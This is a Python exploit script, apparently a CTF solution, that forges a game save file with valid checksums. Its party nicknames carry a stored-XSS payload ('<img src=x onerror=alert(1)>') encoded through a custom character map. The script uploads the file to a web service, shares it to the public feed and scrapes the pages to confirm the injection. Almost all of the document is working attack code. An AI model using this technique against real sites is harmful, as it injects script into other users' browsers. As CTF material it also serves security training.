import os, sys, struct, requests, re, traceback, html
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
print("start")
s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
try:
    for k,v in eval(open("artifacts/cookie.txt").read()).items(): s.cookies.set(k,v)
except Exception as e: print("cookie err",e)
REV={}
for line in open("artifacts/map.txt"):
    b,_,r=line.partition(' ')
    r=r.strip()
    try: ch=html.unescape(eval(r))
    except Exception: continue
    if len(ch)==4 and len(set(ch))==1:
        REV.setdefault(ch[0], int(b,16))
# fill standard letters/digits if missing
for i,c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"): REV.setdefault(c,0xBB+i)
for i,c in enumerate("abcdefghijklmnopqrstuvwxyz"): REV.setdefault(c,0xD5+i)
for i,c in enumerate("0123456789"): REV.setdefault(c,0xA1+i)
print({k:hex(v) for k,v in REV.items() if k in "<>&'/=() !."})
def enc(t):
    return bytes(REV.get(c,0x00) for c in t)+b'\xff'
def checksum(data):
    t=0
    for i in range(0,len(data)-len(data)%4,4): t=(t+struct.unpack_from('<I',data,i)[0])&0xFFFFFFFF
    return ((t&0xFFFF)+(t>>16))&0xFFFF
SIZES={0:3884,1:3968,2:3968,3:3968,4:3848,5:3968,6:3968,7:3968,8:3968,9:3968,10:3968,11:3968,12:3968,13:2000}
def make_save(party, name):
    buf=bytearray(0x20000)
    def sec(idx,counter,data):
        sc=bytearray(0x1000); sc[0:len(data)]=data
        struct.pack_into('<H',sc,0xFF4,idx); struct.pack_into('<H',sc,0xFF6,checksum(sc[0:SIZES.get(idx,3968)]))
        struct.pack_into('<I',sc,0xFF8,0x08012025); struct.pack_into('<I',sc,0xFFC,counter)
        buf[idx*0x1000:(idx+1)*0x1000]=sc
    s0=bytearray(SIZES[0]); s0[0:8]=name.ljust(8,b'\x00')[:8]; struct.pack_into('<I',s0,0x0A,12345); sec(0,100,s0)
    s1=bytearray(SIZES[1]); struct.pack_into('<I',s1,0x234,len(party))
    for i,p in enumerate(party): s1[0x238+i*100:0x238+(i+1)*100]=p
    sec(1,100,s1)
    for i in range(2,14): sec(i,100,bytes(SIZES[i]))
    return bytes(buf)
def pkm(nickbytes, idx=0):
    p=bytearray(100); struct.pack_into('<I',p,0,0x12345678+idx); struct.pack_into('<I',p,4,12345)
    p[8:8+10]=nickbytes.ljust(10,b'\x00')[:10]
    struct.pack_into('<I',p,0x54,50)
    n=len(nickbytes)
    if n<10: p[8+n]=0xFF
    return bytes(p)
payload="<img src=x onerror=alert(1)>"
chunks=[payload[i:i+10] for i in range(0,len(payload),10)]
print("chunks",chunks)
party=[pkm(enc(c),i) for i,c in enumerate(chunks)]
sv=make_save(party, enc("<b>HI"))
r=s.post(BASE+"/boxes",data={"title":"xsschant","description":"d"},files={'save':('x.sav',sv)},timeout=30,allow_redirects=False)
print("upload",r.status_code,r.headers.get('location'))
if r.status_code==303:
    loc=r.headers['location']
    t=s.get(loc,timeout=20).text
    m=re.search(r'<p class="card-line">(.*?)</p>',t,re.S); print("CHANT RAW:",repr(m.group(1)) if m else None)
    m=re.search(r'<dt>Trainer</dt><dd>(.*?)</dd>',t,re.S); print("NAME RAW:",repr(m.group(1)) if m else None)
    m=re.search(r'<ol class="party-list">(.*?)</ol>',t,re.S); print("PARTY RAW:",repr(m.group(1))[:800] if m else None)
    # share it and look at feed
    s.post(loc+"/share",timeout=20,allow_redirects=False)
    t=s.get(BASE+"/",timeout=20).text
    m=re.search(r'<ul class="feed">(.*?)</ul>',t,re.S); print("FEED RAW:",repr(m.group(1))[:1500] if m else None)
